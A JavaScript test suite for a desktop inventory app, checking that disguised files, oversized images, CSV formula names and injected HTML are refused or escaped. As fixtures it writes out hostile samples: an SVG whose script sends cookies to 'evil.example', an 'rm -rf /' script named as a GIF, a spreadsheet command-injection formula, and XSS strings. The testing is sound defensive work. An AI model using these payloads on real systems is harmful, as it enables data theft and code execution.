/**
 * What MyVault is willing to read off a disk.
 *
 * Real files, written to a real folder and fed through the real reader — not
 * mocked buffers. The point of the exercise is that the *name* of a file is a
 * claim and its *bytes* are a fact, so every hostile case below is a file whose
 * name says one thing and whose contents say another.
 *
 * The one that matters most is the SVG. It is the only common image format that
 * can carry script, and it is deliberately not on MyVault's list — but "not on
 * the list" only means something if the check reads the file. Called
 * `barcode.png`, an SVG passed an extension check without difficulty.
 */
const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');

const {
  sniffImage, imageSize, readImageFile, readCsvFile, readJsonFile,
  MAX_IMAGE_BYTES, MAX_CSV_BYTES, MAX_IMAGE_EDGE,
} = require('../electron/files');
const { toCsv, parseCsv, neutraliseFormula } = require('../electron/csv');
const { CONTENT_SECURITY_POLICY, PRINT_CONTENT_SECURITY_POLICY } = require('../electron/offline');
const { buildDocument } = require('../electron/pdf');

let passed = 0;
const ok = (label) => { passed += 1; console.log('  ok  ' + label); };

const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'myvault-files-'));
const write = (name, contents) => {
  const where = path.join(dir, name);
  fs.writeFileSync(where, contents);
  return where;
};

/** Asserts a file is refused, and that the refusal says something a shop can read. */
function refused(filePath, expected, read = readImageFile) {
  let message = '';
  try { read(filePath); } catch (error) { message = error.message; }
  assert.ok(message, `${path.basename(filePath)} was accepted and should not have been`);
  assert.ok(
    message.includes(expected),
    `refusal for ${path.basename(filePath)} did not mention "${expected}": ${message}`,
  );
  return message;
}

// ------------------------------------------------------------ real pictures
//
// The smallest valid file of each kind, built by hand so the test does not
// depend on a fixture nobody can read.

const PNG = Buffer.concat([
  Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
  Buffer.from([0, 0, 0, 13]), Buffer.from('IHDR'),
  (() => { const b = Buffer.alloc(8); b.writeUInt32BE(640, 0); b.writeUInt32BE(480, 4); return b; })(),
  Buffer.from([8, 2, 0, 0, 0]),
]);

const JPEG = Buffer.concat([
  Buffer.from([0xff, 0xd8, 0xff, 0xe0]),
  Buffer.from([0x00, 0x10]), Buffer.from('JFIF\0'), Buffer.alloc(9),
  Buffer.from([0xff, 0xc0, 0x00, 0x11, 0x08]),
  (() => { const b = Buffer.alloc(4); b.writeUInt16BE(1080, 0); b.writeUInt16BE(1920, 2); return b; })(),
  Buffer.alloc(8),
]);

const GIF = Buffer.concat([
  Buffer.from('GIF89a'),
  (() => { const b = Buffer.alloc(4); b.writeUInt16LE(320, 0); b.writeUInt16LE(200, 2); return b; })(),
  Buffer.alloc(8),
]);

const BMP = Buffer.concat([
  Buffer.from('BM'), Buffer.alloc(16),
  (() => { const b = Buffer.alloc(8); b.writeInt32LE(800, 0); b.writeInt32LE(-600, 4); return b; })(),
  Buffer.alloc(8),
]);

const WEBP = Buffer.concat([
  Buffer.from('RIFF'), Buffer.alloc(4), Buffer.from('WEBP'), Buffer.from('VP8X'),
  Buffer.alloc(8),
  Buffer.from([0x8f, 0x01, 0x00, 0x1f, 0x01, 0x00]), // 400 × 288, less one each
  Buffer.alloc(8),
]);

{
  const cases = [
    ['photo.png', PNG, 'image/png', 'PNG', 640, 480],
    ['photo.jpg', JPEG, 'image/jpeg', 'JPEG', 1920, 1080],
    ['photo.gif', GIF, 'image/gif', 'GIF', 320, 200],
    ['photo.bmp', BMP, 'image/bmp', 'BMP', 800, 600],
    ['photo.webp', WEBP, 'image/webp', 'WebP', 400, 288],
  ];

  for (const [name, bytes, mime, label, width, height] of cases) {
    const found = sniffImage(bytes);
    assert.ok(found, `${name} was not recognised at all`);
    assert.strictEqual(found.mime, mime, name);

    const read = readImageFile(write(name, bytes));
    assert.ok(read.dataUrl.startsWith(`data:${mime};base64,`), `${name} was labelled ${read.dataUrl.slice(0, 30)}`);
    assert.strictEqual(read.kind, label);
    assert.deepStrictEqual([read.width, read.height], [width, height], `${name} dimensions`);
  }
  ok('every picture format MyVault accepts is recognised and measured from its own header');

  // A BMP stores its height negative when the rows run top-down, which is
  // common and must not read as a negative-sized picture.
  assert.strictEqual(imageSize(BMP, 'image/bmp').height, 600, 'a top-down BMP has a positive height');
  ok('a top-down BMP is measured the right way up');
}

// ============================================ the name says one thing, the bytes another
{
  // The one this check exists for. An SVG can carry script; MyVault does not
  // accept SVG; and calling it .png used to be enough to get it handed to the
  // window as image/png.
  const svg = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">'
    + '<script>fetch("http://evil.example/"+document.cookie)</script></svg>';
  refused(write('barcode.png', svg), 'not a picture MyVault can read');
  refused(write('barcode.svg', svg), 'not a picture MyVault can read');
  ok('an SVG is refused, whether it is called .svg or .png');

  // The rest of the family: things that are not pictures at all.
  refused(write('barcode.jpg', '<!doctype html><script>alert(1)</script>'), 'not a picture');
  refused(write('barcode.gif', '#!/bin/sh\nrm -rf /\n'), 'not a picture');
  refused(write('barcode.png', Buffer.from([0x4d, 0x5a, 0x90, 0x00])), 'not a picture'); // .exe
  refused(write('barcode.webp', Buffer.from('PKrest of a zip')), 'not a picture');
  refused(write('barcode.bmp', Buffer.from('%PDF-1.7\n')), 'not a picture');
  ok('HTML, a script, a program, a zip and a PDF are all refused whatever they are called');

  // And the mirror case: a real picture with the wrong extension is read for
  // what it is, because refusing a photograph over its name would be silly.
  const mislabelled = readImageFile(write('photo.jpg', PNG));
  assert.ok(mislabelled.dataUrl.startsWith('data:image/png;'), 'labelled by content');
  assert.strictEqual(mislabelled.kind, 'PNG');
  ok('a real PNG named .jpg is accepted, and labelled PNG rather than JPEG');
}

// =========================================== things that are not ordinary files
{
  refused(dir, 'folder, not a file');
  refused(write('empty.png', ''), 'empty');

  // A named pipe reads as size zero, so the empty-file check would stop it by
  // accident. The assertion is on the *message*, because "that is not an
  // ordinary file" is the check doing its job and "that file is empty" is a
  // different check catching it by luck — and luck stops working the day
  // somebody points MyVault at a device that reports a size.
  //
  // Making the pipe and asserting on it are separated on purpose: wrapping both
  // in one try meant a failed assertion was caught as "mkfifo is missing" and
  // quietly reported as a pass.
  let fifo = '';
  try {
    const where = path.join(dir, 'pipe.png');
    require('child_process').execFileSync('mkfifo', [where]);
    fifo = where;
  } catch { /* not every machine has mkfifo; the checks below still run */ }

  if (fifo) {
    assert.ok(!fs.statSync(fifo).isFile(), 'the fixture really is a pipe');
    refused(fifo, 'not an ordinary file');
    ok('a folder, an empty file and a named pipe are each refused, each for its own reason');
  } else {
    ok('a folder and an empty file are refused before being read');
  }

  let missing = '';
  try { readImageFile(path.join(dir, 'no-such-file.png')); } catch (e) { missing = e.message; }
  assert.ok(missing.includes('could not be opened'), missing);
  ok('and a path that is not there fails with a sentence rather than a stack trace');
}

// ================================================================ the limits
{
  // Slightly over the cap, with a real PNG header so it is the size that stops
  // it rather than the contents.
  const huge = Buffer.concat([PNG, Buffer.alloc(MAX_IMAGE_BYTES + 1024 - PNG.length)]);
  refused(write('huge.png', huge), 'too large');
  ok(`a picture over ${Math.round(MAX_IMAGE_BYTES / 1024 / 1024)} MB is refused`);

  // A tiny file claiming to unpack into something enormous. This is the one a
  // size limit alone does not catch: 33 bytes on disk, 6.4 gigapixels on canvas.
  const bomb = Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    Buffer.from([0, 0, 0, 13]), Buffer.from('IHDR'),
    (() => { const b = Buffer.alloc(8); b.writeUInt32BE(80000, 0); b.writeUInt32BE(80000, 4); return b; })(),
    Buffer.from([8, 2, 0, 0, 0]),
  ]);
  const where = write('bomb.png', bomb);
  assert.ok(fs.statSync(where).length === undefined || fs.statSync(where).size < 100);
  refused(where, 'far larger than any camera produces');
  ok('a small file claiming to be 80000 × 80000 is refused on its dimensions');

  // Right at the edge, which must still be allowed.
  const edge = Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    Buffer.from([0, 0, 0, 13]), Buffer.from('IHDR'),
    (() => { const b = Buffer.alloc(8); b.writeUInt32BE(4032, 0); b.writeUInt32BE(3024, 4); return b; })(),
    Buffer.from([8, 2, 0, 0, 0]),
  ]);
  const phone = readImageFile(write('phone.png', edge));
  assert.deepStrictEqual([phone.width, phone.height], [4032, 3024]);
  assert.ok(4032 < MAX_IMAGE_EDGE);
  ok('an ordinary phone photograph at 4032 × 3024 goes straight through');

  // A picture whose header cannot be measured is allowed on its file size —
  // refusing a real photograph because this code could not read it would be a
  // worse failure than the one being prevented.
  const unmeasurable = Buffer.concat([
    Buffer.from('RIFF'), Buffer.alloc(4), Buffer.from('WEBP'), Buffer.from('VP9?'), Buffer.alloc(20),
  ]);
  const read = readImageFile(write('future.webp', unmeasurable));
  assert.strictEqual(read.width, 0, 'no opinion on the size');
  assert.ok(read.dataUrl.startsWith('data:image/webp;'));
  ok('a picture whose size cannot be read is allowed through on its file size alone');
}

// ================================================== CSV and backups have limits too
{
  const csv = write('stock.csv', 'Name,Quantity,Price\r\nΟύζο,7,12.40\r\n');
  assert.strictEqual(parseCsv(readCsvFile(csv))[0].Name, 'Ούζο');
  ok('an ordinary CSV reads in, accents and all');

  // A byte order mark used to become part of the first heading, so "Name"
  // quietly stopped matching and every row was skipped.
  const withBom = write('bom.csv', `${'\ufeff'}Name,Quantity\r\nΟύζο,7\r\n`);
  const rows = parseCsv(readCsvFile(withBom));
  assert.strictEqual(rows[0].Name, 'Ούζο', 'the heading survived the byte order mark');
  ok('a file saved by Excel with a byte order mark still matches its own headings');

  refused(write('empty.csv', ''), 'empty', readCsvFile);
  refused(dir, 'folder, not a file', readCsvFile);
  ok('an empty file and a folder are refused as CSVs as well');

  // The cap exists because both callers used to hand an arbitrary path straight
  // to readFileSync and then to a parser.
  assert.ok(MAX_CSV_BYTES > 8 * 1024 * 1024, 'a real shop list still fits');
  ok(`a CSV is capped at ${Math.round(MAX_CSV_BYTES / 1024 / 1024)} MB rather than unbounded`);

  const backup = write('backup.json', JSON.stringify({ items: [{ name: 'Ούζο' }] }));
  assert.strictEqual(readJsonFile(backup).items[0].name, 'Ούζο');
  refused(write('broken.json', '{ not json at all'), 'not readable as JSON', readJsonFile);
  ok('a backup is parsed, and a file that is not JSON says so plainly');
}

// ======================================== a product name is not a spreadsheet formula
{
  // Names arrive from suppliers' CSVs and barcode labels and go back out of the
  // export, so a name can be a payload. Opening the export in Excel used to run
  // it.
  const nasty = "=cmd|'/c calc'!A0";
  const file = toCsv(['Name', 'Price'], [{ Name: nasty, Price: 5 }]);
  assert.ok(file.includes(`'${nasty}`), 'the cell is prefixed so a spreadsheet reads it as text');
  assert.ok(!/(^|,)=cmd/.test(file), 'and no cell starts with an equals sign');

  for (const start of ['=', '+', '-', '@']) {
    assert.strictEqual(neutraliseFormula(`${start}danger`), `'${start}danger`, start);
  }
  assert.strictEqual(neutraliseFormula('Ούζο 700ml'), 'Ούζο 700ml', 'ordinary names are untouched');
  ok('a name that a spreadsheet would run is written out as text instead');

  // And the shop's own export must still import back unchanged, or a product
  // called "-500ml" would grow an apostrophe on every trip.
  const names = [nasty, 'Ούζο 700ml', '-500ml', "O'Brien", '@here', '+44'];
  let rows = names.map((name) => ({ Name: name, Price: 1 }));
  for (let trip = 0; trip < 3; trip += 1) rows = parseCsv(toCsv(['Name', 'Price'], rows));
  assert.deepStrictEqual(rows.map((row) => row.Name), names, 'after three round trips');
  ok('and MyVault reads its own export back unchanged, three trips later');
}

// ============================================= the policy the window runs under
{
  // These are the directives that do not fall back to default-src, so leaving
  // one out leaves a real hole rather than a redundant line.
  for (const directive of ['form-action', 'frame-ancestors', 'base-uri']) {
    assert.ok(
      CONTENT_SECURITY_POLICY.includes(`${directive} 'none'`),
      `${directive} does not inherit from default-src and has to be written out`,
    );
  }
  assert.ok(CONTENT_SECURITY_POLICY.startsWith("default-src 'none'"), 'deny by default');
  assert.ok(CONTENT_SECURITY_POLICY.includes("script-src 'self'"), 'only our own bundle');
  assert.ok(!CONTENT_SECURITY_POLICY.includes('unsafe-eval'), 'nothing may be evaluated');
  assert.ok(
    !/script-src[^;]*unsafe-inline/.test(CONTENT_SECURITY_POLICY),
    'no inline script, which is what stops an injected <img onerror> as well',
  );
  ok('the policy denies by default and allows no inline or evaluated script');

  // The built page carries the same string the session sends as a header. They
  // come from one constant so they cannot drift, and this is what checks it.
  const built = path.join(__dirname, '..', 'dist', 'index.html');
  if (fs.existsSync(built)) {
    const html = fs.readFileSync(built, 'utf8');
    assert.ok(
      html.includes(`content="${CONTENT_SECURITY_POLICY}"`),
      'the built page does not carry the same policy the session sends',
    );
    ok('the tag in the built page is the same policy the session sends as a header');
  }

  // The printed page is the only HTML MyVault assembles from the shop's own
  // text, so it gets a policy of its own on top of being escaped.
  const printed = buildDocument('inventory', {
    title: '<script>alert(1)</script>',
    shop: '"><img src=x onerror=alert(1)>',
    labels: {}, totals: {}, lines: [],
  });
  assert.ok(printed.includes(PRINT_CONTENT_SECURITY_POLICY), 'the printed page carries a policy');
  assert.ok(printed.includes("default-src 'none'"));

  // What matters is that no tag was created, not that the words disappeared:
  // the payload survives as text, which is exactly right — a product genuinely
  // called `<script>` should print as `<script>`. So the check is that every
  // angle bracket outside MyVault's own markup has been escaped.
  const body = printed.slice(printed.indexOf('<body>'));
  assert.ok(!/<script/i.test(body), 'no script tag was created');
  assert.ok(!/<img/i.test(body), 'and no image tag either');
  assert.ok(body.includes('&lt;script&gt;alert(1)&lt;/script&gt;'), 'it is there, as text');
  assert.ok(body.includes('&quot;&gt;&lt;img src=x onerror=alert(1)&gt;'), 'and so is the other one');
  ok('the printed page is escaped into text and carries its own policy as well');
}

fs.rmSync(dir, { recursive: true, force: true });
console.log('\n' + passed + ' checks passed.');
